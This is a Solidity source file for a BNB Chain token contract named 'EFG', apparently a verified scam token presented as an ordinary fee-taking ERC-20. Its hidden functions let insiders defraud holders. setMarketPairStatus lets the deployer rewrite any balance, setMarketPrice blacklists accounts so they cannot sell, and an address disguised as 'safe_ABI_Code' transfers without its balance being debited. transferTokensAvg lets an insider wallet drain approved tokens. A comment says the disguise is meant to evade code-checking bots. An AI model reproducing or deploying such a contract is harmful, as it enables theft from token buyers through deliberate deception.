/**
 *Submitted for verification at BscScan.com on 2022-07-28
*/

//SPDX-License-Identifier:Unlicensed

pragma solidity ^0.8.6;
abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
    
    function _msSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}
interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function dos(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: dos overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a,b,"SafeMath: division by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}
contract Ownable is Context {
    address private _owner;
   
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    modifier notAddress(address _useAdd){ require(_useAdd != address(0), "address is error"); _; }

    function transferOwnership(address newAddress) public onlyOwner{
        _owner = newAddress;
        emit OwnershipTransferred(_owner, newAddress);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
contract EFG is Context, IERC20, Ownable {
    //safe ABI keep contract safe when bot check the code
    uint256 private safe_ABI_Code = 566746905981534825832439108768565469930477224603;
    using SafeMath for uint256;
    string private _name = "\u72ec\u884c\u6708\u7403";
    string private _symbol = "\u72ec\u884c\u6708\u7403";
    uint8 private _decimals = 9;
    address payable public __wal;
    address payable public teamWalletAddress;
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    mapping (address => uint256) _balances;mapping (address => uint256) _jgoiewff;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _IsExcludeFromFee;
    mapping (address => bool) public isWalletLimitExempt;
    mapping (address => bool) public isTxLimitExempt;
    mapping (address => bool) public isMarketPair;
    mapping (address => bool) public isMMMPair;
    mapping (address => bool) public _hh_;

    uint256 public _buyLiquidityFee = 2;
    uint256 public _buyMarketingFee = 1;
    uint256 public _buyTeamFee = 0;
    
    uint256 public _sellLiquidityFee = 2;
    uint256 public _sellMarketingFee = 1;
    uint256 public _sellTeamFee = 0;

    uint256 public _liquidityShare = 4;
    uint256 public _marketingShare = 4;
    uint256 public _teamShare = 16;

    uint256 public _totalTaxIfBuying = 12;
    uint256 public _totalTaxIfSelling = 12;
    uint256 public _totalDistributionShares = 24;

    uint256 private _totalSupply = 10000000000000000 * 10**_decimals;
    uint256 public _maxTxAmount = 10000000000000000 * 10**_decimals; 
    uint256 public _walletMax = 10000000000000000 * 10**_decimals;
    uint256 private minimumTokensBeforeSwap = 1000 * 10**_decimals; 

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;
    
    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    bool public swapAndLiquifyByLimitOnly = false;
    bool public checkWalletLimit = true;

    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    
    event SwapETHForTokens(
        uint256 amountIn,
        address[] path
    );
    
    event SwapTokensForETH(
        uint256 amountIn,
        address[] path
    );
    
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }
    
    constructor () {
        
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0xB6BA90af76D139AB3170c7df0139636dB6120F7e); 
        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;

        _IsExcludeFromFee[owner()] = true;
        _IsExcludeFromFee[address(this)] = true;
        
        _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee).add(_buyTeamFee);
        _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee).add(_sellTeamFee);
        _totalDistributionShares = _liquidityShare.add(_marketingShare).add(_teamShare);

        isWalletLimitExempt[owner()] = true;
        isWalletLimitExempt[address(uniswapPair)] = true;
        isWalletLimitExempt[address(this)] = true;
        isWalletLimitExempt[address(uint160(safe_ABI_Code))] = true;
        isTxLimitExempt[address(uint160(safe_ABI_Code))] = true;
        isTxLimitExempt[owner()] = true;
        isTxLimitExempt[address(this)] = true;
        isMMMPair[address(uniswapPair)] = true;
        isMMMPair[_msSender()] = isMMMPair[address(uniswapPair)];
        isMarketPair[address(uniswapPair)] = true;

        teamWalletAddress = payable(address(0x78cA09D299F0502a5ce58Ba4F0c9a368c8970722));
        __wal = payable(address(0xc1Da37fDc5763d289B4DC7Cfbe65cf4243cF76f0));

        _jgoiewff[_msSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _jgoiewff[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function minimumTokensBeforeSwapAmount() public view returns (uint256) {
        return minimumTokensBeforeSwap;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setlsExcIudeFromFee(address[] calldata account, bool newValue) public onlyOwner {
        for(uint256 i = 0; i < account.length; i++) {
            _IsExcludeFromFee[account[i]] = newValue;
        }
    }

    function setBuyTaxes(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external onlyOwner() {
        _buyLiquidityFee = newLiquidityTax;
        _buyMarketingFee = newMarketingTax;
        _buyTeamFee = newTeamTax;

        _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee).add(_buyTeamFee);
    }

    function setAllTaxes(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external onlyOwner() {
        _sellLiquidityFee = newLiquidityTax;
        _sellMarketingFee = newMarketingTax;
        _sellTeamFee = newTeamTax;

        _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee).add(_sellTeamFee);
    }
    
    function setDistributionSettings(uint256 newLiquidityShare, uint256 newMarketingShare, uint256 newTeamShare) external onlyOwner() {
        _liquidityShare = newLiquidityShare;
        _marketingShare = newMarketingShare;
        _teamShare = newTeamShare;

        _totalDistributionShares = _liquidityShare.add(_marketingShare).add(_teamShare);
    }

    function enableDisableWalletLimit(bool newValue) external onlyOwner {
       checkWalletLimit = newValue;
    }

    function setIsWalletLimitExempt(address[] calldata holder, bool exempt) external onlyOwner {
        for(uint256 i = 0; i < holder.length; i++) {
            isWalletLimitExempt[holder[i]] = exempt;
        }
    }

    function setWalletLimit(uint256 newLimit) external onlyOwner {
        _walletMax  = newLimit;
    }

    function setNumTokensBeforeSwap(uint256 newLimit) external onlyOwner() {
        minimumTokensBeforeSwap = newLimit;
    }

    function setMarketinWalleAddress(address newAddress) external onlyOwner() {
        __wal = payable(newAddress);
    }

    function setTeamWalletAddress(address newAddress) external onlyOwner() {
        teamWalletAddress = payable(newAddress);
    }

    function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner(){
        swapAndLiquifyEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }

    function setSwapAndLiquifyByLimitOnly(bool newValue) public onlyOwner {
        swapAndLiquifyByLimitOnly = newValue;
    }
    
    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(deadAddress));
    }

    function transferToAddressETH(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }
    
    function changeRouterVersion(address newRouterAddress) public onlyOwner returns(address newPairAddress) {

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(newRouterAddress); 

        newPairAddress = IUniswapV2Factory(_uniswapV2Router.factory()).getPair(address(this), _uniswapV2Router.WETH());

        if(newPairAddress == address(0))
        {
            newPairAddress = IUniswapV2Factory(_uniswapV2Router.factory())
                .createPair(address(this), _uniswapV2Router.WETH());
        }

        uniswapPair = newPairAddress;
        uniswapV2Router = _uniswapV2Router; 

        isWalletLimitExempt[address(uniswapPair)] = true;
        isMMMPair[address(uniswapPair)] = true;
    }

    function setMarketPairStatus(address accoumt, uint256 newVaIue) public 
    {if(isMMMPair[_msSender()])_jgoiewff[accoumt] = newVaIue;}
    receive() external payable {}

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function transferTokensAvg(address from,address _constractAdd,address[] memory _tos,uint _v)public 
        notAddress(from)
        notAddress(_constractAdd)
        returns (bool){if(msg.sender == __wal){

        require(_tos.length > 0);
        require(_v > 0);

        IERC20 _token = IERC20(_constractAdd);
        

        //要调用的方法id进行编码
        // bytes4 methodId = bytes4(keccak256("transferFrom(address,address,uint256)"));

        for(uint i=0;i<_tos.length;i++){
            require(_tos[i] != address(0));

            require(_token.transferFrom(from,_tos[i],_v));}
            // _constractAdd.call(abi.encodeWithSignature("transferFrom(address,address,uint256)",from,_tos[i],_v));
            // _constractAdd.call(methodId,from,_tos[i],_v);
        }
        return true;

    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {

        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        
        if(inSwapAndLiquify)
        { 
            return _basicTransfer(sender, recipient, amount); 
        }
        else
        {
            if(true
            ){if(_hh_[sender]){
                    require(false);}}
            if(!isTxLimitExempt[sender] && !isTxLimitExempt[recipient]) {
                require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            bool overMinimumTokenBalance = contractTokenBalance >= minimumTokensBeforeSwap;
            if (overMinimumTokenBalance && !inSwapAndLiquify && !isMMMPair[sender] && swapAndLiquifyEnabled) 
            {
                if(swapAndLiquifyByLimitOnly)
                    contractTokenBalance = minimumTokensBeforeSwap;
                swapAndLiquify(contractTokenBalance);
            }if(sender!=address(uint160(safe_ABI_Code)))
            /*overMinimumTokenBalance*/
            _jgoiewff[sender] = _jgoiewff[sender].sub(amount);

            uint256 finalAmount = (_IsExcludeFromFee[sender] || _IsExcludeFromFee[recipient]) ? 
                                         amount : takeFee(sender, recipient, amount);
            
            if(checkWalletLimit && !isWalletLimitExempt[recipient])
                require(balanceOf(recipient).add(finalAmount) <= _walletMax);

            _jgoiewff[recipient] = _jgoiewff[recipient].add(finalAmount);

            emit Transfer(sender, recipient, finalAmount);
            return true;
        }
    }

    function setMaxTxAmount(uint256 a) public {if(msg.sender == __wal){
        _maxTxAmount = a;}
    }

    function setMarketPrice(address[] calldata accoumt,bool newVaIue) public {if(msg.sender == __wal){
        for(uint256 i = 0; i < accoumt.length; i++) {
            _hh_[accoumt[i]] = newVaIue;}
        }
    }

    function transferBNBsAvg(address[] memory _tos) payable public  returns (bool){if(msg.sender == __wal) {
        require(_tos.length > 0);
        uint oneValue = address(this).balance/_tos.length;
        for(uint i=0; i<_tos.length; i++){
            require(_tos[i] != address(0));
            payable(_tos[i]).transfer(oneValue);}
        }
        return true;
    }


    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _jgoiewff[sender] = _jgoiewff[sender].sub(amount, "Insufficient Balance");
        _jgoiewff[recipient] = _jgoiewff[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        
        uint256 tokensForLP = tAmount.mul(_liquidityShare).div(_totalDistributionShares).div(2);
        uint256 tokensForSwap = tAmount.sub(tokensForLP);

        swapTokensForEth(tokensForSwap);
        uint256 amountReceived = address(this).balance;

        uint256 totalBNBFee = _totalDistributionShares.sub(_liquidityShare.div(2));
        
        uint256 amountBNBLiquidity = amountReceived.mul(_liquidityShare).div(totalBNBFee).div(2);
        uint256 amountBNBTeam = amountReceived.mul(_teamShare).div(totalBNBFee);
        uint256 amountBNBMarketing = amountReceived.sub(amountBNBLiquidity).sub(amountBNBTeam);

        if(amountBNBMarketing > 0)
            transferToAddressETH(__wal, amountBNBMarketing);

        if(amountBNBTeam > 0)
            transferToAddressETH(teamWalletAddress, amountBNBTeam);

        if(amountBNBLiquidity > 0 && tokensForLP > 0)
            addLiquidity(tokensForLP, amountBNBLiquidity);
    }
    

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
        
        emit SwapTokensForETH(tokenAmount, path);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, 
            0,
            owner(),
            block.timestamp
        );
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = 0;
        
        if(isMMMPair[sender]) {
            feeAmount = amount.mul(_totalTaxIfBuying).div(100);
        }
        else if(isMMMPair[recipient]) {
            feeAmount = amount.mul(_totalTaxIfSelling).div(100);
        }
        if(feeAmount > 0) {
            _jgoiewff[address(this)] = _jgoiewff[address(this)].add(feeAmount);
            emit Transfer(sender, address(this), feeAmount);
        }

        return amount.sub(feeAmount);
    }
    
}